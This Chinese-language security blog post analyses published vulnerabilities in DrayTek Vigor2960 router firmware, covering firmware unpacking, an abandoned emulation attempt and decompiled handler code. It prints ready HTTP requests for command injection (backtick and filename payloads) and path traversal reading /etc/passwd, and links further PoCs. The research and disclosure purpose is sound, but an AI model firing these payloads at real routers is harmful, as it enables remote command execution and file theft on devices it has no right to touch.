#  某路由器RCE漏洞分析   
原创 侠盗鲁平  Security丨Art   2023-10-14 18:30  
  
##  下载地址   
- https://fw.draytek.com.tw/Vigor2960/Firmware/  
  
##  使用手册   
- https://support.formosa.no/DrayTek/Downloads/Vigor2960/Manual/Vigor2960%20%E7%B3%BB%E5%88%97%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8A%20V2.1.pdf  
  
##  厂商漏洞列表   
- https://www.draytek.com/about/security-advisory  
  
##  架构   
  
根据漏洞通告表述为MIPS架构，可通过qemu的system模式搭建模拟系统**实际bin下执行文件镜像为arm小端elf文件，拿到shell上传工具需注意平台文件格斯**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kEgicicM5SiaCd8VHxn02fwlYWd2d6eJ6wic1nng86NXpPvFKwK1E5uic6gZ7Pqc3d5PulwibzrjqT9Jdq23eXT8Vpfg/640?wx_fmt=png "")  
##  环境搭建失败   
  
尝试搭建环境但是失败  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kEgicicM5SiaCd8VHxn02fwlYWd2d6eJ6wicJOOKYoosEk86Ep4jUbJfFibsx66BWk8J4ZS32ud1EHwgLreRYSah13Q/640?wx_fmt=png "")  
  
  
UBI文件格式镜像打包文件  
```
 ubireader_extract_images Vigor2960_v1.4.1.all  

```  
  
解包释放镜像  
```
ubireader_extract_files Vigor2960_v1.4.1.all

```  
  
解包释放文件  
```
#配置网络，创建网桥
sudo apt-get install bridge-utils
sudo brctl addbr Virbr0
sudo ifconfig Virbr0 192.168.10.1/24 up
 
#创建tap接口，添加到网桥
sudo apt install uml-utilities
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.10.11/24 up
sudo brctl addif Virbr0 tap


sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic

#进入虚拟机后，配置ip地址，测试与主机的连通性
ifconfig eth0 192.168.10.2/24 up
ping 192.168.10.1 -c 10
 
#回到主机中将squashfs-root文件夹复制到虚拟机
scp -r ubifs-root/ root@192.168.10.2:~/

mount -o bind /dev ./ubifs-root/dev
mount -o bind /proc ./ubifs-root/proc

ssh root@192.168.10.2
chroot squashfs-root /bin/sh
接着启动web服务成功，但未找到vpn全部启动脚本，仅搭建http服务没有任何意义

```  
  
  
  
##  漏洞   
### 最新版本漏洞，疑似CVE-2023-24229  
#### 版本要求 1.5.1.4，作者已删除poc,根据谷歌镜像获得  
```
POST /cgi-bin/mainfunction.cgi HTTP/1.1
Host: 192.168.1.1
Content-Length: 57
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: SESSION_ID_VIGOR=
Connection: close

action=commandTable&command=14&parameter=`touch test.txt`

```  
### 最新版本漏洞，CVE-2023-1009  
#### 版本要求  
  
v1.5.1.4  
  
根据poc直接在action中找方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kEgicicM5SiaCd8VHxn02fwlYWd2d6eJ6wicoPDDumKM3IKcM8sI0A7spu2wdGafzW6SUyHKZ4g2ILliazH89ichF7bQ/640?wx_fmt=png "")  
  
对value写入v6缓冲区和/tmp/拼接未对字符串进行任何处理，任意文件读取  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kEgicicM5SiaCd8VHxn02fwlYWd2d6eJ6wicj8Iibjb78QAaTMEpU6subJPpfYB0WZbM9ymHEmdmM2ZwXZpULF3VAIw/640?wx_fmt=png "")  
  
  
sub_11B88为向keyword_object.cfg写配置，我们不进入循环，意义不大  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kEgicicM5SiaCd8VHxn02fwlYWd2d6eJ6wic8KJicUf4FGMVqLD73zp3uqDqwh2kZSHPcD5KgDiccB9yJu2Wkd7FJTiaw/640?wx_fmt=png "")  
  
  
https://github.com/xxy1126/Vuln/blob/main/Draytek/1.md  
```
POST /cgi-bin/mainfunction.cgi HTTP/1.1
Host: xxxxxxxx
Content-Length: 61
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: xxxxxxxx
Referer: xxxxxxxxxx
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: SESSION_ID_VIGOR=7:26EB81E4EA6DC603661320EBD1C938DC
Connection: close

action=doCfgExport&option=/../etc/passwd-&rtick=1663484341535

```  
### CVE-2020-8515  
#### 版本要求  
  
version<1.5.1  
  
https://cn-sec.com/archives/1423548.html  
  
https://www.secpulse.com/archives/166775.html  
  
https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-(cve-2020-8515)/  
  
反编译main函数，找到action参数的处理函数  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kEgicicM5SiaCd8VHxn02fwlYWd2d6eJ6wicEQDocBJTbOn1R8TJTz58MRcbLA7eb0CYwDwufW28micLp7wibY1c5Fqw/640?wx_fmt=png "")  
  
  
跟进subB3E0  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kEgicicM5SiaCd8VHxn02fwlYWd2d6eJ6wicacfLEp3oTMMPpSrCZ0qzXVXm6YGUgm0cb63j9BjMHKtPnBS7AicJ8FA/640?wx_fmt=png "")  
  
  
对照off_41408  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kEgicicM5SiaCd8VHxn02fwlYWd2d6eJ6wicbc63EtibtfrtsGJibJTdfUDyOdHkNtJTKSGOJzMXxOicZPVbnQGYXW54w/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kEgicicM5SiaCd8VHxn02fwlYWd2d6eJ6wicvgul1x1KYVBFPSKojLWKricK44Xt2pg5DRysqykVXnhmwX45JBZcr1Q/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kEgicicM5SiaCd8VHxn02fwlYWd2d6eJ6wicbxRU6IqHeBkiahR9GM94MbWKX6pvbrI3X6FToPaaqjqsrvDjc6nb37A/640?wx_fmt=png "")  
  
  
过check函数然后v40和openssl拼接  
  
popen执行命令  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kEgicicM5SiaCd8VHxn02fwlYWd2d6eJ6wiccj5Jaib0NtpVUavUVdCO9piar6iaq5RHmnEuNeyeGgAth0Fyibicunia0JhQ/640?wx_fmt=png "")  
  
#### poc  
  
https://github.com/imjdl/CVE-2020-8515-PoC  
### CVE-2020-14472  
#### 版本要求  
  
version<1.5.1.1  
  
https://nosec.org/home/detail/4631.html  
  
https://bestwing.me/drayteck-vigor-vulnerability-disclosure.html  
#### 全poc  
  
https://github.com/Cossack9989/Vulns/blob/d9f9fad0e967859cc119a9d3c31e90adc17c655f/IoT/CVE-2020-14472.md?plain=1#L4  
### CVE-2020-15415  
  
在1.5.1版本下，当访问cgi-bin/mainfunction.cgi/cvmcfgupload这个路径时，如果content type为text/x-python-script，则在filename中存在命令注入。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kEgicicM5SiaCd8VHxn02fwlYWd2d6eJ6wiclJQUu1pMt9JhPxmjkuiaRUMq32cf55gAdJAE6GFoU30ZlL24wfDCRoQ/640?wx_fmt=png "")  
  
  
  
跟进sub_12F24  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/kEgicicM5SiaCd8VHxn02fwlYWd2d6eJ6wicjwphWzg1GHM2Ugb69PuMiaSSFxSk4ic1PXwpiaNndnnNepGuXdgXNJGnQ/640?wx_fmt=jpeg "")  
  
  
命令拼接触发点如下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/kEgicicM5SiaCd8VHxn02fwlYWd2d6eJ6wicjwphWzg1GHM2Ugb69PuMiaSSFxSk4ic1PXwpiaNndnnNepGuXdgXNJGnQ/640?wx_fmt=jpeg "")  
  
#### poc  
```
POST /cgi-bin/mainfunction.cgi/cvmcfgupload?1=2 HTTP/1.1
Host: xxx.xxx.xxx.xxx:xxxx
Content-Length: 174
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh,en;q=0.9,zh-CN;q=0.8,la;q=0.7
Connection: close

------WebKitFormBoundary`

Content-Disposition: form-data; name="abc"; filename="t';id;echo '1_"`

Content-Type: text/x-python-script`

------WebKitFormBoundary--`

```  
### [无真实poc]CVE-2020-19664  
  
https://github.com/peanuts62/bug_poc  
### [无poc]CNVD-2021-28718  
  
DrayTek Vigor2960 1.5.1.2  
### [无poc]CNVD-2021-28719  
  
DrayTek Vigor2960 1.5.1.2  
### [无poc]CVE-2021-43118  
  
- END -  
  
  
